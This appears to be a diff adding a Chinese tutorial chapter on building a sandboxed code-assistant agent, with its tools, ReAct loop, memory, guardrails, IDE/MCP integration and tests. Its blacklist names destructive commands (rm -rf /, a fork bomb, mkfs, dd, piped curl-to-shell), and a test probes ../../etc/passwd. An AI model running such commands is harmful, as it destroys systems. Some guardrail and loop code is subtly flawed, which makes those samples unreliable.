+def handle_format(cmd: str = "ruff format .", dry_run: bool = True) -&gt; str:
+    """⚠️ 写操作！代码格式化。默认 dry_run=True 仅显示差异。"""
+    if dry_run:
+        out = subprocess.run(cmd.split() + ["--check", "--diff"],
+                            capture_output=True, text=True, timeout=60)
+        return f"=== DIFF ===\n{out.stdout[-3000:]}" if out.stdout else "✅ 已格式化"
+    if not _ALLOW_WRITE:
+        return "❌ 默认只读。要真格式化请 ALLOW_WRITE=True 且 dry_run=False"
+    out = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=120)
+    _audit(cmd, out.returncode)
+    return "✅ 已格式化" if out.returncode == 0 else out.stderr[-1500:]</code></pre>
+<blockquote><strong>handler 设计要点</strong>：所有 handler 都返回 <strong>字符串</strong>（不是 Python 对象），便于 LLM 直接读。</blockquote>
+<p>---</p>
+<h2 id="17.5-多文件项目结构：tools.py-/-agent.py-/-memory.py-/-main.py">17.5 多文件项目结构：tools.py / agent.py / memory.py / main.py</h2>
+<h3>17.5.1 ASCII 模块图</h3>
+<pre><code class="language-text">ch17/
+├── main.py            # CLI 入口 / IDE sidebar server
+├── agent.py           # 主循环（ReAct）—— ch10 §10.6
+├── tools.py           # 8 工具 handler + 安全护栏
+├── memory.py          # 项目级 4 种记忆（ch08 §8.6）
+├── audit.log          # 所有写操作审计日志（git tracked）
+└── tests/
+    ├── test_tools.py  # 8 工具单元测试
+    └── test_agent.py  # ReAct 主循环集成测试</code></pre>
+<p><strong>4 文件职责对照 ch03 四大件</strong>：</p>
+<table><tr><th>文件</th><th>职责</th><th>ch03 四大件</th></tr><tr><td><code>main.py</code></td><td>CLI 入口 / IDE 集成 / FastAPI server</td><td>（编排器）</td></tr><tr><td><code>agent.py</code></td><td>ReAct 主循环 + LLM 决策</td><td>🧠 <strong>大脑</strong> + 📋 <strong>规划</strong></td></tr><tr><td><code>tools.py</code></td><td>8 工具 + 安全护栏 + 沙箱</td><td>🛠 <strong>工具</strong></td></tr><tr><td><code>memory.py</code></td><td>项目级记忆（短期 + 长期 DB + 向量 + 路径白名单）</td><td>💾 <strong>记忆</strong></td></tr></table>
+<h3>17.5.2 tools.py 完整代码（节选）</h3>
+<pre><code class="language-python"># tools.py — 8 工具 + 安全护栏
+import subprocess, os, json
+from datetime import datetime
+from pathlib import Path
+
+PROJECT_ROOT = Path(__file__).parent.resolve()
+_ALLOW_WRITE = False
+_BLACKLIST = ["rm -rf /", "sudo ", "git push --force", ":(){ :|:&amp; };:", "mkfs", "dd if="]
+_audit_log = PROJECT_ROOT / "audit.log"
+
+def _safe_path(p: str) -&gt; str:
+    """解析并校验 path 在项目根内。"""
+    abs_path = (PROJECT_ROOT / p).resolve()
+    if not str(abs_path).startswith(str(PROJECT_ROOT)):
+        raise ValueError(f"❌ 路径逃逸：{p} 不在项目根 {PROJECT_ROOT}")
+    return str(abs_path)
+
+def _audit(cmd: str, rc: int) -&gt; None:
+    """记录所有写操作到 audit.log。"""
+    ts = datetime.now().isoformat()
+    with open(_audit_log, "a") as f:
+        f.write(f"{ts}\t{cmd}\trc={rc}\n")
+
+# 8 handler（同 17.4 节，省略）
+HANDLERS = {
+    "ls": handle_ls, "find": handle_find, "grep": handle_grep,
+    "git_status": handle_git_status, "git_diff": handle_git_diff,
+    "git_log": handle_git_log,
+    "test": handle_test, "run": handle_run,
+    "lint": handle_lint, "format": handle_format,
+}</code></pre>
+<h3>17.5.3 agent.py 主循环</h3>
+<pre><code class="language-python"># agent.py — ReAct 主循环（ch10 §10.6）
+import json
+from openai import OpenAI
+from tools import HANDLERS
+
+class CodeAssistantAgent:
+    def __init__(self, llm=None):
+        self.llm = llm or OpenAI()
+        self.history = []  # 短期记忆（ch08 §8.2）
+
+    def run(self, query: str) -&gt; str:
+        self.history.append({"role": "user", "content": query})
+        for step in range(10):  # 最多 10 步
+            resp = self.llm.chat.completions.create(
+                model="gpt-4o-mini",
+                messages=[{"role": "system", "content": SYS_PROMPT}] + self.history,
+                tools=TOOLS_SCHEMA,
+            )
+            msg = resp.choices[0].message
+            if msg.tool_calls:
+                for tc in msg.tool_calls:
+                    args = json.loads(tc.function.arguments)
+                    result = HANDLERS[tc.function.name](**args)
+                    self.history.append({"role": "tool", "tool_call_id": tc.id,
+                                        "content": result})
+                self.history.append(msg)
+                continue
+            return msg.content
+        return "⏱ 超过 10 步未完成"</code></pre>
+<h3>17.5.4 memory.py 项目级记忆</h3>
+<pre><code class="language-python"># memory.py — 4 种记忆（ch08 §8.6 金字塔模型）
+import sqlite3, json
+from pathlib import Path
+
+DB = Path(__file__).parent / "ch17_memory.db"
+
+class ProjectMemory:
+    def __init__(self):
+        self.short_term = []            # 当前对话
+        self.db = sqlite3.connect(DB)
+        self.db.execute("""CREATE TABLE IF NOT EXISTS prefs (
+            key TEXT PRIMARY KEY, value TEXT)""")
+        self.db.execute("""CREATE TABLE IF NOT EXISTS recent_files (
+            path TEXT, opened_at TIMESTAMP)""")
+
+    def remember_pref(self, key: str, value: str):
+        self.db.execute("INSERT OR REPLACE INTO prefs VALUES (?, ?)", (key, value))
+        self.db.commit()
+
+    def recent_files(self, limit: int = 20) -&gt; list:
+        cur = self.db.execute(
+            "SELECT path FROM recent_files ORDER BY opened_at DESC LIMIT ?", (limit,))
+        return [r[0] for r in cur]</code></pre>
+<h3>17.5.5 main.py CLI 入口</h3>
+<pre><code class="language-python"># main.py — CLI + IDE sidebar
+import sys
+from agent import CodeAssistantAgent
+
+def repl():
+    print("🔧 ch17 代码助手 (输入 :quit 退出)")
+    agent = CodeAssistantAgent()
+    while True:
+        try:
+            q = input("\n&gt;&gt;&gt; ").strip()
+        except (EOFError, KeyboardInterrupt):
+            break
+        if q in (":quit", ":exit", ""): break
+        print(agent.run(q))
+
+if __name__ == "__main__":
+    repl()</code></pre>
+<p><strong>ch16 → ch17 代码量对比</strong>：</p>
+<table><tr><th>项</th><th>ch16</th><th>ch17</th></tr><tr><td>总代码行</td><td>200</td><td><strong>~600</strong></td></tr><tr><td>文件数</td><td>1</td><td><strong>4</strong></td></tr><tr><td>工具数</td><td>5</td><td><strong>8</strong></td></tr><tr><td>安全层</td><td>0 行</td><td><strong>~80 行</strong></td></tr><tr><td>测试代码</td><td>0 行</td><td><strong>~150 行</strong></td></tr></table>
+<h3>17.5.5a ch17 vs 真实工具对比（不依赖真 API）</h3>
+<p>ch17 的 8 工具 handler 全部用 <code>subprocess.run</code> 调系统命令——<strong>已经和真实工具一致</strong>，不是 mock。ch16 的"mock 模式 vs 真 LLM 模式"中，"mock"特指 <strong>LLM 决策</strong>，而非 shell 执行。</p>
+<table><tr><th>工具</th><th>ch17 调用</th><th>真实 CLI</th><th>等价性</th></tr><tr><td>ls</td><td><code>subprocess.run(["ls", "-la", p])</code></td><td><code>ls -la path</code></td><td>✅</td></tr><tr><td>find</td><td><code>subprocess.run(["find", p, "-name", n])</code></td><td><code>find path -name "*.py"</code></td><td>✅</td></tr><tr><td>grep</td><td><code>subprocess.run(["grep", "-rn", pat, p])</code></td><td><code>grep -rn pattern path</code></td><td>✅</td></tr><tr><td>git_status</td><td><code>subprocess.run(["git", "status", "--short"])</code></td><td><code>git status --short</code></td><td>✅</td></tr><tr><td>test</td><td><code>subprocess.run(["pytest", "--tb=short"])</code></td><td><code>pytest --tb=short</code></td><td>✅</td></tr><tr><td>run</td><td><code>subprocess.run(cmd, shell=True)</code></td><td>（任意 shell）</td><td>✅</td></tr><tr><td>lint</td><td><code>subprocess.run(["ruff", "check", "."])</code></td><td><code>ruff check .</code></td><td>✅</td></tr><tr><td>format</td><td><code>subprocess.run(["ruff", "format", "."])</code></td><td><code>ruff format .</code></td><td>✅</td></tr></table>
+<p><strong>唯一非真实工具</strong>：<code>mcp_server.py</code> 暴露成 MCP server 让 IDE 调用——这是接入层，不影响工具本身的真实性。</p>
+<h3>17.5.6 ch16 单文件 → ch17 多文件迁移指南</h3>
+<p>ch16 是 200 行单文件 personal_assistant.py。ch17 拆成 4 文件的标准做法：</p>
+<table><tr><th>步骤</th><th>操作</th><th>工作量</th></tr><tr><td><strong>Step 1</strong></td><td>复制 ch16 <code>personal_assistant.py</code> 到 <code>tools.py</code></td><td>5 min</td></tr><tr><td><strong>Step 2</strong></td><td>把 ch16 5 工具 handler 改成 ch17 8 工具（ls/find/grep/test/run/lint/format + 保留原 3 个）</td><td>1 hour</td></tr><tr><td><strong>Step 3</strong></td><td>抽出主循环到 <code>agent.py</code>，去掉 CLI 入口逻辑</td><td>30 min</td></tr><tr><td><strong>Step 4</strong></td><td>新建 <code>memory.py</code>，加 sandbox 路径白名单</td><td>30 min</td></tr><tr><td><strong>Step 5</strong></td><td>抽出 <code>main.py</code>，加 audit log 启动参数</td><td>15 min</td></tr><tr><td><strong>Step 6</strong></td><td>加 <code>audit.log</code> 文件 + git commit hook</td><td>15 min</td></tr></table>
+<p><strong>总计</strong>：~2.5 hours 把 ch16 升级到 ch17 结构。这是读者实操 Part 4 的关键 skill——<strong>单文件 → 多文件的演进</strong>。</p>
+<h3>17.5.7 4 文件 import 关系图</h3>
+<pre><code class="language-python"># main.py
+from agent import CodeAssistantAgent   # 主循环
+from memory import ProjectMemory        # 4 种记忆
+
+# agent.py
+from tools import HANDLERS, TOOLS_SCHEMA  # 8 工具
+import json, os
+
+# tools.py
+import subprocess, os, json         # stdlib only
+from pathlib import Path
+
+# memory.py
+import sqlite3, json, numpy as np    # sqlite3 stdlib + numpy 可选
+from pathlib import Path</code></pre>
+<p><strong>依赖方向</strong>：main → agent → tools / memory。<strong>tools / memory 互不依赖</strong>——便于单测。</p>
+<p>---</p>
+<h2 id="17.6-记忆系统升级：项目级记忆（ch08-§8.6）">17.6 记忆系统升级：项目级记忆（ch08 §8.6）</h2>
+<h3>17.6.1 项目级 4 种记忆</h3>
+<blockquote><strong>ch08 §8.6 预告</strong>：ch17 项目级记忆是 ch08 金字塔模型的"完整版"——短期 context + 长期 DB + 长期向量 + 长期图谱。ch17 用前 3 种，第 4 种图谱在 ch18 才用。</blockquote>
+<p>ch16 §16.6 用了短期 + 长期 2 种记忆。ch17 要进到 <strong>4 种</strong>（完整 ch08 金字塔）：</p>
+<table><tr><th>层</th><th>ch16 是什么</th><th>ch17 是什么</th></tr><tr><td>🔴 短期</td><td>当前对话 context</td><td>同 ch16 + tool_call results</td></tr><tr><td>🟡 长期 DB</td><td>用户偏好 JSON</td><td>+ 项目偏好（test runner / lint 规则 / commit 规范）</td></tr><tr><td>🟢 长期向量</td><td>❌ 无</td><td>代码片段语义检索（"找用户认证的代码"）</td></tr><tr><td>🔵 长期图谱</td><td>❌ 无</td><td>❌ ch17 不需要（ch18 才用）</td></tr></table>
+<h3>17.6.2 ch08 ↔ ch17 记忆桥接</h3>
+<pre><code class="language-python"># memory.py 完整实现（4 种记忆）
+import sqlite3, json, numpy as np
+from pathlib import Path
+
+class ProjectMemory:
+    def __init__(self, project_root: str):
+        self.short_term = []
+        self.db = sqlite3.connect(Path(project_root) / "ch17_memory.db")
+        self.db.execute("""CREATE TABLE IF NOT EXISTS prefs (
+            key TEXT PRIMARY KEY, value TEXT)""")
+        # 简化向量层：mock embedding
+        self.vectors = {}  # {code_id: (vector, code_text)}
+
+    def remember_pref(self, key, value):
+        self.db.execute("INSERT OR REPLACE INTO prefs VALUES (?,?)", (key, value))
+        self.db.commit()
+
+    def get_pref(self, key, default=None):
+        cur = self.db.execute("SELECT value FROM prefs WHERE key=?", (key,))
+        row = cur.fetchone()
+        return row[0] if row else default
+
+    def index_code(self, code_id: str, code_text: str):
+        """向量层：mock embedding（实际应用用 sentence-transformers）"""
+        # 简化：hash 作为"embedding"
+        vec = np.array([hash(code_text[:100]) % 1000 / 1000.0] * 64)
+        self.vectors[code_id] = (vec, code_text)
+
+    def search_code(self, query: str, top_k: int = 3) -&gt; list:
+        """语义搜索代码片段（mock）"""
+        results = []
+        for code_id, (vec, text) in self.vectors.items():
+            score = float(np.dot(vec, vec))  # mock 评分
+            results.append((score, code_id, text[:200]))
+        results.sort(reverse=True)
+        return results[:top_k]</code></pre>
+<h3>17.6.3 沙箱保护（路径白名单）</h3>
+<p>ch17 的记忆层必须 <strong>沙箱保护</strong>——所有写入数据库的路径必须在项目根内：</p>
+<pre><code class="language-python">def _safe_path(p: str) -&gt; str:
+    """路径白名单校验。"""
+    abs_p = Path(p).resolve()
+    if not str(abs_p).startswith(str(PROJECT_ROOT)):
+        raise ValueError(f"❌ 路径 {p} 不在项目根 {PROJECT_ROOT}")
+    return str(abs_p)</code></pre>
+<p>---</p>
+<h2 id="17.7-安全护栏：read-only-默认-+-写操作确认">17.7 安全护栏：read-only 默认 + 写操作确认</h2>
+<h3>17.7.1 read-only 默认</h3>
+<p>ch17 有 3 类操作：</p>
+<table><tr><th>操作类型</th><th>工具</th><th>默认行为</th></tr><tr><td><strong>🟢 只读</strong></td><td>ls / find / grep / git_status / git_diff / git_log</td><td><strong>永远允许</strong>（无需 ALLOW_WRITE）</td></tr><tr><td><strong>🟡 副作用可控</strong></td><td>test / lint</td><td><strong>永远允许</strong>（只产生缓存或报告）</td></tr><tr><td><strong>🔴 写操作</strong></td><td>run / format / git commit / git push</td><td><strong>必须 ALLOW_WRITE=True</strong></td></tr></table>
+<p><strong>设计哲学</strong>：<strong>deny-by-default</strong>。所有写操作默认拒绝，用户显式开启。这是 <strong>fail-safe</strong> 的工程实践——bug 默认行为应该是"什么也不做"，不是"删除一切"。</p>
+<h3>17.7.2 5 类危险命令拦截（_BLACKLIST）</h3>
+<pre><code class="language-python">_BLACKLIST = [
+    "rm -rf /",           # 删根目录
+    "rm -rf ~",           # 删家目录
+    "sudo ",              # 提权（Code Assistant 不应需要）
+    "git push --force",   # 覆盖远程历史
+    "git push -f",        # 同上简写
+    ":(){ :|:&amp; };:",      # fork 炸弹
+    "mkfs",               # 格式化文件系统
+    "dd if=",             # 块设备写
+    "chmod -R 777 /",     # 全权限
+    "curl ... | sh",      # 远程脚本执行
+]</code></pre>
+<p><strong>任何包含以上子串的 <code>run</code> 或 <code>format</code> 命令被立即拒绝</strong>，返回字符串错误而非执行。</p>
+<h3>17.7.3 Audit log</h3>
+<p>所有"过了白名单又过了黑名单"的写操作都要记录：</p>
+<pre><code class="language-python">def _audit(cmd: str, rc: int) -&gt; None:
+    ts = datetime.now().isoformat()
+    with open(_audit_log, "a") as f:
+        f.write(f"{ts}\t{cmd}\trc={rc}\n")</code></pre>
+<p><code>audit.log</code> 必须 <strong>git tracked</strong>——便于事后追溯"Agent 在哪天跑了哪些命令"。</p>
+<h3>17.7.4 dry-run 模式</h3>
+<p><strong>所有"写操作"工具的第二个参数必须是 <code>dry_run=True</code></strong>（默认），用户必须显式 <code>dry_run=False</code> 才真执行：</p>
+<pre><code class="language-python">def handle_format(cmd="ruff format .", dry_run=True):
+    if dry_run:  # 只显示 diff，不真改
+        return subprocess_diff_only(cmd)
+    if not _ALLOW_WRITE: return "❌ 默认只读"
+    return subprocess_run_real(cmd)</code></pre>
+<p><strong>典型用户交互</strong>：</p>
+<pre><code class="language-text">&gt;&gt;&gt; 帮我格式化 src/
+=== DIFF ===
+--- src/api.py
++++ src/api.py
+@@ -12,7 +12,7 @@
+-def foo(  x,y  ):
++def foo(x, y):
+=== END ===
+要真格式化请回答 yes
+&gt;&gt;&gt; yes
+✅ 已格式化（audit.log 已记录）</code></pre>
+<p><strong>dry-run + 二次确认</strong> 是写操作类 Agent 的安全黄金法则。</p>
+<h3>17.7.5 二次确认的 4 种实现</h3>
+<table><tr><th>方式</th><th>适用</th><th>代码量</th></tr><tr><td><strong>CLI 内 yes/no 交互</strong></td><td>单用户本地</td><td>5 行</td></tr><tr><td><strong>IDE sidebar 按钮</strong></td><td>Continue / Cursor</td><td>10 行 HTML + JS</td></tr><tr><td><strong>预审批白名单</strong></td><td>企业 CI</td><td>配置文件</td></tr><tr><td><strong>强制人工 review</strong></td><td>高危场景（数据库迁移）</td><td>webhook + 审批</td></tr></table>
+<p><strong>典型 CLI 实现</strong>：</p>
+<pre><code class="language-python">def confirm(prompt: str) -&gt; bool:
+    """CLI 二次确认。"""
+    ans = input(f"\n⚠️ {prompt}\n确认执行？[y/N] ").strip().lower()
+    return ans == "y"
+
+def handle_format_with_confirm(cmd="ruff format .", dry_run=True):
+    if dry_run:
+        diff = subprocess_diff_only(cmd)
+        print(diff)
+        if not confirm(f"将执行: {cmd}"):
+            return "❌ 用户取消"
+    return _do_format(cmd)</code></pre>
+<h3>17.7.6 5 类"必须二次确认"场景</h3>
+<table><tr><th>场景</th><th>确认原因</th><th>误操作成本</th></tr><tr><td><strong><code>git commit --amend</code></strong></td><td>改写本地历史</td><td>🟡 中</td></tr><tr><td><strong><code>git push --force</code></strong></td><td>覆盖远程历史</td><td>🔴 高</td></tr><tr><td><strong><code>rm -rf &lt;dir&gt;</code></strong>（已过黑名单的项目子目录）</td><td>删文件</td><td>🔴 高</td></tr><tr><td><strong><code>pip install / npm install</code></strong></td><td>改 lockfile / 全局包</td><td>🟡 中</td></tr><tr><td><strong><code>format</code> 整个仓库</strong></td><td>重写所有源码</td><td>🔴 高</td></tr></table>
+<blockquote><strong>原则</strong>：<strong>dry-run 默认显示 → 用户 yes 才执行 → audit.log 记录</strong>。三步缺一不可。</blockquote>
+<h3>17.7.7 ch17 安全护栏 vs ch23 安全章节预告</h3>
+<p>ch17 的安全护栏（_ALLOW_WRITE + _BLACKLIST + audit.log + dry-run）是 <strong>Agent 内置防御</strong>——即"工具层 + 应用层"防御。但攻击面 <strong>不止工具层</strong>：</p>
+<table><tr><th>攻击面</th><th>ch17 防御</th><th>ch23 防御层</th></tr><tr><td><strong>tool 误调</strong></td><td>_BLACKLIST + _ALLOW_WRITE</td><td>ch23 §23.2 input validation</td></tr><tr><td><strong>prompt 注入</strong></td><td>❌ ch17 不防</td><td>ch23 §23.3 间接注入检测</td></tr><tr><td><strong>PII 泄露</strong></td><td>部分（黑名单偶然拦截）</td><td>ch23 §23.4 PII 脱敏</td></tr><tr><td><strong>沙箱逃逸</strong></td><td>_safe_path</td><td>ch23 §23.5 容器隔离</td></tr></table>
+<p>ch23 §23 章节会把这 5 层防御 <strong>完整展开</strong>——ch17 是 §23.1 的引子。</p>
+<p>---</p>
+<h2 id="17.8-IDE-集成：Cursor-/-Claude-Code-/-Continue-/-Cody">17.8 IDE 集成：Cursor / Claude Code / Continue / Cody</h2>
+<h3>17.8.1 4 IDE 集成模式对比</h3>
+<table><tr><th>IDE</th><th>集成方式</th><th>协议</th><th>适用场景</th></tr><tr><td><strong>Cursor</strong></td><td>sidebar + Cmd+K</td><td>自有协议 + MCP</td><td>全功能 IDE（最流行）</td></tr><tr><td><strong>Claude Code</strong></td><td>CLI + IDE 桥</td><td>Anthropic SDK</td><td>Anthropic 系模型重度用户</td></tr><tr><td><strong>Continue.dev</strong></td><td>VSCode 扩展</td><td>OpenAI 兼容 API</td><td>开源 + 自托管</td></tr><tr><td><strong>Sourcegraph Cody</strong></td><td>VSCode / JetBrains</td><td>GraphQL + MCP</td><td>企业 + 代码搜索</td></tr></table>
+<h3>17.8.2 Cursor sidebar 接入（HTML demo）</h3>
+<p>Cursor 的核心是 <strong>sidebar + Cmd+K inline edit</strong>。ch17 完全可以模拟：</p>
+<pre><code class="language-html">&lt;!-- ide_sidebar.html — Cursor-style 代码助手 sidebar --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;&lt;head&gt;&lt;title&gt;ch17 Sidebar&lt;/title&gt;
+&lt;style&gt;
+body { font: 13px/1.4 ui-monospace, monospace; margin: 0; background: #1e1e1e; color: #d4d4d4; }
+#chat { padding: 8px; height: 80vh; overflow-y: auto; }
+.msg { margin: 4px 0; padding: 6px 8px; border-radius: 4px; }
+.user { background: #2d2d2d; }
+.assistant { background: #094771; border-left: 3px solid #c026d3; }
+.tool { background: #1a3a1a; font-size: 11px; color: #888; }
+input { width: calc(100% - 16px); padding: 6px; margin: 8px;
+        background: #2d2d2d; color: #d4d4d4; border: 1px solid #444; }
+&lt;/style&gt;&lt;/head&gt;&lt;body&gt;
+&lt;div id="chat"&gt;&lt;/div&gt;
+&lt;input id="q" placeholder="问代码助手..." autofocus&gt;
+&lt;script&gt;
+const chat = document.getElementById('chat');
+document.getElementById('q').addEventListener('keydown', async e =&gt; {
+  if (e.key !== 'Enter') return;
+  const q = e.target.value;
+  e.target.value = '';
+  chat.innerHTML += `&lt;div class="msg user"&gt;${q}&lt;/div&gt;`;
+  // POST 到 ch17 FastAPI server
+  const resp = await fetch('/api/chat', {method:'POST', headers:{'Content-Type':'application/json'},
+                                          body: JSON.stringify({q})});
+  const data = await resp.json();
+  chat.innerHTML += `&lt;div class="msg assistant"&gt;${data.reply}&lt;/div&gt;`;
+  for (const t of data.tool_calls || []) {
+    chat.innerHTML += `&lt;div class="msg tool"&gt;🔧 ${t.name}(${JSON.stringify(t.args)}) → ${t.result}&lt;/div&gt;`;
+  }
+  chat.scrollTop = chat.scrollHeight;
+});
+&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre>
+<p><strong>FastAPI 端点示例</strong>：</p>
+<pre><code class="language-python"># server.py — FastAPI 端点（对应 sidebar fetch）
+from fastapi import FastAPI
+from agent import CodeAssistantAgent
+
+app = FastAPI()
+agent = CodeAssistantAgent()
+
+@app.post("/api/chat")
+async def chat(req: dict):
+    """对应 sidebar fetch('/api/chat')"""
+    reply = agent.run(req["q"])
+    return {"reply": reply, "tool_calls": agent.last_tool_calls or []}</code></pre>
+<p><strong>核心三元素</strong>： 1. <strong>chat 区域</strong> —— 显示用户消息 + Agent 回复 2. <strong>tool call 高亮</strong> —— 紫色左边框 + 灰色背景（匹配主题色 #c026d3） 3. <strong><code>fetch('/api/chat')</code></strong> —— 调 ch17 main.py 的 FastAPI 端点</p>
+<h3>17.8.3 Claude Code / Continue / Cody 概览</h3>
+<table><tr><th>IDE</th><th>接入复杂度</th><th>MCP 支持</th><th>自托管</th><th>企业版</th></tr><tr><td>Cursor</td><td>中（下载 IDE）</td><td>✅ 完整</td><td>❌</td><td>✅</td></tr><tr><td>Claude Code</td><td>低（CLI）</td><td>✅ 部分</td><td>❌</td><td>✅</td></tr><tr><td>Continue</td><td>低（VSCode 插件）</td><td>✅ 完整</td><td>✅</td><td>✅</td></tr><tr><td>Cody</td><td>低（VSCode/JetBrains）</td><td>✅ 完整</td><td>❌</td><td>✅（Sourcegraph）</td></tr></table>
+<p><strong>ch17 推荐路线</strong>：</p>
+<ul><li><strong>学习/原型</strong> → Continue.dev（开源 + VSCode）</li><li><strong>生产/团队</strong> → Cursor 或 Cody</li><li><strong>Anthropic 模型</strong> → Claude Code</li><li><strong>完全自托管</strong> → Continue + Ollama + 自部署 LLM</li></ul>
+<h3>17.8.4 MCP 协议接入（ch12 桥接）</h3>
+<p>ch12 §12.4 讲了 MCP（Model Context Protocol）—— Cursor / Continue / Cody 都支持。把 ch17 暴露成 MCP server：</p>
+<pre><code class="language-python"># mcp_server.py — 把 ch17 暴露成 MCP server
+from mcp.server import Server
+from mcp.types import Tool, TextContent
+import mcp.server.stdio
+from tools import HANDLERS
+
+app = Server("ch17-code-assistant")
+
+@app.list_tools()
+async def list_tools():
+    return [
+        Tool(name="ls", description="列出目录文件", inputSchema={...}),
+        Tool(name="find", description="按名搜索文件", inputSchema={...}),
+        # ... 8 工具全部注册
+    ]
+
+@app.call_tool()
+async def call_tool(name: str, arguments: dict):
+    try:
+        result = HANDLERS[name](**arguments)
+        return [TextContent(type="text", text=result)]
+    except Exception as e:
+        return [TextContent(type="text", text=f"❌ {e}")]
+
+if __name__ == "__main__":
+    app.run(transport="stdio")</code></pre>
+<p>启动后，IDE 通过 stdio JSON-RPC 调用 ch17——Cursor / Continue / Cody 自动识别工具列表。</p>
+<h3>17.8.5 MCP server 完整启动配置</h3>
+<p>把 ch17 暴露成 MCP server 仅需 5 步：</p>
+<pre><code class="language-bash"># 1. 安装 MCP SDK
+pip install mcp
+
+# 2. 启动 mcp_server.py（如 §17.8.4）
+python mcp_server.py
+
+# 3. 在 Cursor 设置 → MCP → 添加 stdio server
+# → name: ch17, command: python, args: ["/path/to/mcp_server.py"]</code></pre>
+<p>或者用 <code>claude_desktop_config.json</code>：</p>
+<pre><code class="language-json">{
+  "mcpServers": {
+    "ch17": {
+      "command": "python",
+      "args": ["/path/to/ch17/mcp_server.py"]
+    }
+  }
+}</code></pre>
+<p>启动后 IDE 自动识别 8 工具——和安装一个 IDE 插件一样简单。</p>
+<h3>17.8.6 4 IDE 集成的 ROI 对比</h3>
+<table><tr><th>IDE</th><th>个人免费</th><th>团队收费</th><th>ch17 配合工作量</th></tr><tr><td><strong>Cursor</strong></td><td>$0（限制）</td><td>$20/月</td><td>0.5 day</td></tr><tr><td><strong>Claude Code</strong></td><td>$0</td><td>$20/月</td><td>1 day</td></tr><tr><td><strong>Continue</strong></td><td>✅ 完全免费</td><td>自部署</td><td>0.5 day</td></tr><tr><td><strong>Cody</strong></td><td>$0</td><td>$9/月</td><td>1 day</td></tr></table>
+<p><strong>推荐组合</strong>：</p>
+<ul><li><strong>学习/原型</strong>：Continue + Ollama + ch17 → 完全免费 + 100% 自托管</li><li><strong>生产/团队</strong>：Cursor Pro $20/月 + ch17 → 最快上手</li><li><strong>企业</strong>：Cody Enterprise + ch17 MCP → 可观测性最强</li></ul>
+<p>---</p>
+<h2 id="17.9-测试与调试">17.9 测试与调试</h2>
+<h3>17.9.1 pytest 单元测试</h3>
+<pre><code class="language-python"># tests/test_tools.py
+import pytest
+from tools import handle_ls, handle_find, handle_grep, handle_run
+from tools import _ALLOW_WRITE, _BLACKLIST
+
+def test_ls_returns_string():
+    result = handle_ls(".")
+    assert isinstance(result, str)
+
+def test_run_blocked_by_default():
+    """默认只读，run 应被拦截。"""
+    result = handle_run("echo hello")
+    assert "只读模式" in result
+
+def test_run_blocked_by_blacklist():
+    """sudo 必被拦截。"""
+    global _ALLOW_WRITE
+    _ALLOW_WRITE = True
+    result = handle_run("sudo apt update")
+    assert "黑名单" in result
+
+def test_grep_finds_todo():
+    result = handle_grep("TODO", ".")
+    assert "TODO" in result or "未找到" in result
+
+def test_safe_path_rejects_escape():
+    """路径逃逸必须被拦截。"""
+    with pytest.raises(ValueError, match="路径逃逸"):
+        from tools import _safe_path
+        _safe_path("../../etc/passwd")</code></pre>
+<h3>17.9.2 Docker sandbox（ch24 预告）</h3>
+<p>测试高危命令用 Docker 沙箱——ch24 成本章节会展开：</p>
+<pre><code class="language-bash"># 在 Docker 容器里跑 Agent
+docker run --rm -v $(pwd):/app -w /app python:3.11-slim \
+    bash -c "pip install -r requirements.txt &amp;&amp; python main.py"</code></pre>
+<p>沙箱能拦截一切 <code>rm -rf /</code>、<code>sudo</code> 等真正破坏性操作——即使 Agent 出 bug 也只是容器被毁。</p>
+<h3>17.9.3 ReAct trace</h3>
+<p>跑一个真实查询，看 ReAct 主循环的完整 trace：</p>
+<pre><code class="language-text">&gt;&gt;&gt; 列出 src/ 下所有 *.py 文件
+[Step 1] LLM 决策：调用工具 find，参数 {name: "*.py", path: "src"}
+[Step 1] tool result: src/api.py\nsrc/utils.py\nsrc/main.py
+[Step 2] LLM 决策：返回最终答案
+[Step 2] Final: src 下有 3 个 py 文件：api.py、utils.py、main.py</code></pre>
+<p>ch17 agent.py 的 <code>run()</code> 方法在每个 step 后打印 trace，便于调试。</p>
+<h3>17.9.4 5 大调试技巧</h3>
+<table><tr><th>#</th><th>技巧</th><th>代码</th></tr><tr><td>1</td><td><strong>开启 verbose 日志</strong></td><td><code>logging.basicConfig(level=logging.DEBUG)</code> 看每次 LLM call</td></tr><tr><td>2</td><td><strong>mock LLM 测试主循环</strong></td><td>把 OpenAI() 换成 mock，跑相同 query 看 trace</td></tr><tr><td>3</td><td><strong>audit.log 反查</strong></td><td>`cat audit.log</td><td>grep "rm"` 看 Agent 跑了哪些写命令</td></tr><tr><td>4</td><td><strong>dry-run 先看 diff</strong></td><td>format/test 默认 dry_run，看清楚再执行</td></tr><tr><td>5</td><td><strong>沙箱隔离</strong></td><td>Docker / 用户级权限跑 Agent，不在 root 下跑</td></tr></table>
+<h3>17.9.5 ch17 常见 5 大错误模式</h3>
+<table><tr><th>错误模式</th><th>症状</th><th>修复</th></tr><tr><td><strong>AGENT 卡死循环</strong></td><td>"调用 ls → ls → ls → ls"</td><td>加 <code>_call_count</code> 计数器；同一工具 &gt;3 次就强制停止</td></tr><tr><td><strong>子进程 hang</strong></td><td>subprocess.run 不返回</td><td>必须 <code>timeout=10/60/120</code>（按工具设）</td></tr><tr><td><strong>路径逃逸未拦截</strong></td><td>用户 query 用了 <code>../../etc/passwd</code></td><td>所有 handler 第一步调 <code>_safe_path()</code></td></tr><tr><td><strong>黑名单绕过</strong></td><td>用户 <code>rm -rf /tmp/x</code>（<code>/</code> 不在子串但漏判）</td><td>同时用 split + token 级检查</td></tr><tr><td><strong>audit.log 越写越大</strong></td><td>日志无限增长</td><td>加 logrotate 或 30 天清理</td></tr></table>
+<p><strong>典型无限循环防护</strong>：</p>
+<pre><code class="language-python">class CodeAssistantAgent:
+    def __init__(self):
+        self._call_count = {}  # {tool_name: count}
+
+    def _increment(self, name):
+        self._call_count[name] = self._call_count.get(name, 0) + 1
+        if self._call_count[name] &gt; 5:
+            raise RuntimeError(f"❌ 工具 {name} 单次会话调用 &gt;5 次")
+
+    def run(self, query):
+        for step in range(10):  # 主循环
+            self._call_count = {}  # 每轮重置计数器
+            # 真实代码：每个 tool_call 之前调 self._increment(name)
+            _ = step  # placeholder
+        return "done"</code></pre>
+<p>---</p>
+<h2 id="17.10-5-个扩展方向">17.10 5 个扩展方向</h2>
